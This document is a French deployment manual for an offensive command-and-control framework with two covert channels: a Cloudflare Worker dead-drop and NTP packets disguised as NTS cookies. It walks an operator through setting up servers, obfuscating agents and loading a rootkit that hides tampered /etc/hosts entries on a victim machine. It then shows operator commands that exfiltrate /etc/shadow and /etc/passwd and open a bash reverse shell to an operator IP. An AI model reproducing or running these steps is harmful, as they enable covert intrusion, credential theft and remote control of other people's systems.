# Manuel de déploiement — Cipherfall C2

Deux canaux C2 indépendants. Même interface opérateur (`operator_cli.py`).

---

## Vue d'ensemble

```
                    ┌─────────────────────────────────────┐
                    │           OPÉRATEUR                 │
                    │  operator_cli.py / tui.py           │
                    │  (machine locale, pas de port ouvert)│
                    └───────────┬─────────────────────────┘
                                │ admin API (localhost)
                    ┌───────────▼─────────────────────────┐
                    │           SERVEUR C2                │
                    │  cloudflare-worker/server.py        │  ← canal 1
                    │        ou                           │
                    │  ntp/server.py                      │  ← canal 2
                    └───────────┬─────────────────────────┘
                                │
              ┌─────────────────┼───────────────────┐
              │ Canal 1         │                   │ Canal 2
              ▼                 │                   ▼
   ┌─────────────────┐          │        ┌──────────────────┐
   │ Cloudflare KV   │          │        │  UDP/123 ou      │
   │ (dead-drop)     │          │        │  TCP/443         │
   └────────┬────────┘          │        └────────┬─────────┘
            │                   │                 │
            ▼                   │                 ▼
   ┌─────────────────┐          │        ┌──────────────────┐
   │   AGENT         │          │        │   AGENT NTP      │
   │ (victime, HTTP) │          │        │ (victime, UDP)   │
   └─────────────────┘          │        └──────────────────┘
```

| | Canal Cloudflare Worker | Canal NTP |
|---|---|---|
| Transport | HTTPS/443 vers Cloudflare | UDP/123 (fallback TCP/443) |
| Infrastructure | Cloudflare Workers + KV | VPS avec IP publique |
| Détection réseau | Très difficile (trafic HTTPS normal) | NTP légitime (paquets NTS Cookie) |
| Prérequis victime | Accès HTTPS outbound | `/etc/hosts` compromis + UDP/123 outbound |
| Persistance tâches | KV Cloudflare (TTL 1h) | Aucune (UDP fire-and-forget) |

---

## Canal 1 — Cloudflare Worker

### Architecture

```
  OPÉRATEUR                SERVEUR C2               CLOUDFLARE              VICTIME
  (laptop)                 (laptop/VPS)              (Worker KV)             (cible)

  operator_cli.py ──POST──► server.py
                            [pending]
                                │
                                │ PUT /task/{agent_id}
                                ▼
                            server.py ◄──────────────► worker.js
                            [sent]                      KV: task:{id}
                                                            │
                                                            │ GET /task/{id}
                                                            ▼
                                                        agent.py
                                                        [exécute cmd]
                                                            │
                                                            │ PUT /result/{task_id}
                                                            ▼
                            server.py ◄─────────────── worker.js
                            [done]                      KV: result:{id}
                                │
  operator_cli.py ◄──GET──── server.py
  [output affiché]
```

### Étape 1 — Déployer le Worker Cloudflare

```bash
cd Modules/C2/cloudflare-worker

# 1. Installer wrangler
npm install -g wrangler
wrangler login

# 2. Créer le namespace KV
wrangler kv:namespace create "C2_KV"
# → copier l'id retourné dans wrangler.toml :
#   id = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

# 3. Calculer le token partagé (même PSK que le serveur)
python3 -c "
import hashlib, hmac
PSK = 'mon_mot_de_passe_secret'
token = hmac.new(PSK.encode(), b'worker_token', hashlib.sha256).hexdigest()[:32]
print('WORKER_SECRET =', token)
"

# 4. Injecter le secret dans le Worker
wrangler secret put WORKER_SECRET
# → coller la valeur calculée ci-dessus

# 5. Déployer
wrangler deploy
# → noter l'URL : https://cipherfall-c2.XXXX.workers.dev
```

### Étape 2 — Démarrer le serveur C2

```bash
cd Modules/C2/cloudflare-worker
pip install -r requirements.txt

WORKER_URL=https://cipherfall-c2.XXXX.workers.dev \
C2_PSK=mon_mot_de_passe_secret \
python3 server.py

# Sortie attendue :
# [*] C2 server started
# [*] Admin API on http://127.0.0.1:1337
# [*] Polling Worker every 10s
```

> Le serveur n'expose aucun port public. Toute la communication passe par Cloudflare.

### Étape 3 — Préparer et déployer l'agent

```bash
# Récupérer l'ID de l'agent sur la cible
python3 agent.py --id
# → ex: 3685e93ab6597954b51d83969dd4f1ad

# Générer un agent personnalisé via la TUI
cd Modules/C2/cloudflare-worker
WORKER_URL=https://... C2_PSK=... python3 tui.py
# → onglet "Payload" → remplir WORKER_URL et PSK → "Bake Agent"
# → optionnel : cocher "Obfuscate" pour passer par obfuscator_py.py

# OU manuellement : éditer les variables en tête d'agent.py puis obfusquer
python3 ../../Obfuscator/obfuscator_py.py agent.py
# → déployer le fichier obfusqué sur la cible
```

### Étape 4 — Opérer

```bash
# Voir les agents connectés
C2_ADMIN_PORT=1337 python3 ../operator_cli.py agents

# Envoyer une commande (préfixe d'ID = 4 chars min)
python3 ../operator_cli.py task 3685 "id && hostname"

# Attendre et récupérer le résultat
python3 ../operator_cli.py wait <task_id>

# Exfiltrer un fichier
python3 ../operator_cli.py task 3685 "UPLOAD:/etc/shadow"
python3 ../operator_cli.py wait <task_id>
```

---

## Canal 2 — NTP C2

### Architecture

```
                         /etc/hosts (compromis par rootkit)
  0.debian.pool.ntp.org  ──────────────────────► 87.106.187.97
                                                  (VPS C2)

  VICTIME                                          SERVEUR C2
  agent.py                                         ntp/server.py

  1. résoud le domaine NTP                         UDP/123
     → obtient l'IP du VPS (via /etc/hosts)    ┌──────────┐
  2. envoie beacon NTP Mode-3                   │ NTP pkt  │
     ┌──────────────────────────────────────────►  Mode-3  │
     │  NTP header (48B)                        │  + ext   │
     │  + NTS Cookie field (type 0x0104)        └────┬─────┘
     │    └── AES-256-GCM(zlib(JSON beacon))         │
     │                                               │ tâche en attente ?
     │  NTP header (48B)                        ┌────▼─────┐
     └──────────────────────────────────────────┤  NTP pkt │
        + NTS Cookie field (si tâche présente)  │  Mode-4  │
          └── AES-256-GCM(zlib(JSON task))      └──────────┘

  Fallback : si UDP/123 bloqué → TCP/443 (même format, longueur préfixée)
```

### Prérequis

- **VPS** avec IP publique, accès root, UDP/123 et TCP/443 ouverts
- **Rootkit chargé sur la cible** : le rootkit injecte les entrées NTP dans `/etc/hosts`
  et les cache de tout processus sauf l'agent C2 (comm `ntp-agent`)

```
# Vérifier que le rootkit a injecté les entrées (bypass read hook via mmap)
python3 -c "
import mmap
f = open('/etc/hosts', 'rb')
m = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
print(m[:].decode())
" | grep 87.106
```

### Étape 1 — Démarrer le serveur NTP C2

```bash
# Sur le VPS (nécessite root pour bind UDP/123 et TCP/443)
cd /opt/cipherfall/ntp_c2
pip install -r requirements.txt

C2_PSK=mon_mot_de_passe_secret python3 server.py

# Sortie attendue :
# [*] NTP C2 listening on UDP/123 + TCP/443
# [*] Admin API on http://127.0.0.1:1338

# En arrière-plan :
C2_PSK=... nohup python3 server.py > /var/log/ntp_c2.log 2>&1 &

# Debug (affiche chaque beacon/dispatch) :
C2_PSK=... C2_DEBUG=1 python3 server.py
```

> Port admin par défaut : **1338** (différent du canal Cloudflare : 1337)

### Étape 2 — Déployer l'agent sur la cible

```bash
# Sur la CIBLE — s'assurer que le rootkit est chargé
cd /tmp/rb && insmod rootkit.ko

# Vérifier que le domaine NTP résoud bien vers le VPS
# (en se nommant ntp-agent pour bypasser le filtre du rootkit)
python3 -c "
import socket, ctypes
ctypes.CDLL('libc.so.6').prctl(15, b'ntp-agent', 0, 0, 0)
print(socket.gethostbyname('0.debian.pool.ntp.org'))
"
# doit afficher l'IP du VPS

# Récupérer l'ID agent
python3 /tmp/agent.py --id

# Lancer l'agent (beacon toutes les ~60s ± 30s)
C2_PSK=mon_mot_de_passe_secret python3 /tmp/agent.py

# Intervalle court pour les tests
C2_PSK=... C2_INT=15 C2_JITTER=5 nohup python3 /tmp/agent.py > /tmp/agent.log 2>&1 &
```

### Étape 3 — Opérer

```bash
# Depuis le VPS ou via SSH tunnel vers le VPS
# Port admin NTP C2 = 1338

# Voir les agents
C2_ADMIN_PORT=1338 python3 operator_cli.py agents

# Envoyer une commande
C2_ADMIN_PORT=1338 python3 operator_cli.py task 3685 "id && uname -r"

# Attendre le résultat (l'agent doit faire un nouveau beacon)
C2_ADMIN_PORT=1338 python3 operator_cli.py wait <task_id>
```

---

## Interface opérateur (operator_cli.py)

Fonctionne avec les deux canaux. Changer le port selon le canal.

```
┌─────────────────────────────────────────────────────────────────┐
│  COMMANDE                         DESCRIPTION                   │
├─────────────────────────────────────────────────────────────────┤
│  agents                           liste les agents vus          │
│  tasks                            liste toutes les tâches       │
│  task <id_prefix> <cmd>           envoie une commande           │
│  result <task_id>                 lit le résultat               │
│  wait <task_id>                   attend + affiche le résultat  │
│  register <agent_id> [label]      enregistre un agent           │
└─────────────────────────────────────────────────────────────────┘

Variables d'environnement :
  C2_ADMIN_PORT=1337   (Cloudflare, défaut)
  C2_ADMIN_PORT=1338   (NTP)
```

Exemples :

```bash
# Exfiltrer /etc/passwd
python3 operator_cli.py task 3685 "UPLOAD:/etc/passwd"
python3 operator_cli.py wait <task_id> | base64 -d

# Reverse shell (listener sur 4444 côté opérateur)
python3 operator_cli.py task 3685 "bash -i >& /dev/tcp/MON_IP/4444 0>&1"
```

---

## TUI — tableau de bord interactif (commun aux deux canaux)

Pointée vers le bon port admin selon le canal utilisé :

```bash
cd Modules/C2

# Canal Cloudflare (admin port 1337)
WORKER_URL=https://... C2_PSK=... C2_ADMIN_PORT=1337 python3 tui.py

# Canal NTP (admin port 1338)
C2_PSK=... C2_ADMIN_PORT=1338 python3 tui.py
```

```
┌──────────────────────────────────────────────────────┐
│  [ Agents ]  [ Payload ]                             │
├──────────────────────────────────────────────────────┤
│  ID           Label        Dernière activité         │
│  3685e93a     debian-vm    il y a 12s                │
│  120ae267     my-laptop    il y a 3 min              │
├──────────────────────────────────────────────────────┤
│  > commande : _                                      │
└──────────────────────────────────────────────────────┘
  r = refresh   Enter = sélectionner/envoyer   q = quitter
```

L'onglet **Payload** génère un agent personnalisé selon le type choisi :
- **cloudflare** : bake `cloudflare-worker/agent.py` avec `WORKER_URL` et `C2_PSK`
- **ntp** : bake `ntp/agent.py` avec `C2_PSK`, intervalle et jitter (pas de WORKER URL)

Les deux modes supportent l'obfuscation automatique via `obfuscator_py.py`.

---

## Checklist de déploiement rapide

### Canal Cloudflare Worker

```
[ ] wrangler deploy (worker.js + secret WORKER_SECRET)
[ ] WORKER_URL noté
[ ] pip install -r cloudflare-worker/requirements.txt
[ ] WORKER_URL=... C2_PSK=... python3 cloudflare-worker/server.py
[ ] Agent baked avec TUI ou manuellement, obfusqué, déployé sur cible
[ ] python3 operator_cli.py agents  → agent visible
```

### Canal NTP

```
[ ] Rootkit chargé sur la cible (insmod rootkit.ko)
[ ] Vérifier injection /etc/hosts via mmap
[ ] VPS : UDP/123 + TCP/443 ouverts dans firewall
[ ] C2_PSK=... python3 ntp/server.py  (sur VPS, root)
[ ] C2_PSK=... C2_INT=15 python3 /tmp/agent.py  (sur cible)
[ ] C2_ADMIN_PORT=1338 python3 operator_cli.py agents  → agent visible
```

---

## Dépannage

| Symptôme | Cause probable | Correction |
|---|---|---|
| Agent absent de la liste | PSK différent entre agent et serveur | Vérifier `C2_PSK` des deux côtés |
| Tâche reste `sent` | Agent ne beacon pas / tâche perdue | Vérifier que l'agent tourne, re-queue la tâche |
| NTP : agent résoud la vraie IP | Rootkit pas chargé / comm pas `ntp-agent` | `insmod rootkit.ko`, vérifier via mmap |
| NTP : beacon timeout | UDP/123 bloqué ET TCP/443 bloqué | Vérifier firewall VPS et NAT victime |
| NTP : résultat jamais reçu | Paquet trop grand (> 203B réseau) | Sortie tronquée à 120 chars automatiquement |
| Cloudflare : 404 sur Worker | WORKER_SECRET incorrect | Recalculer token avec même PSK |
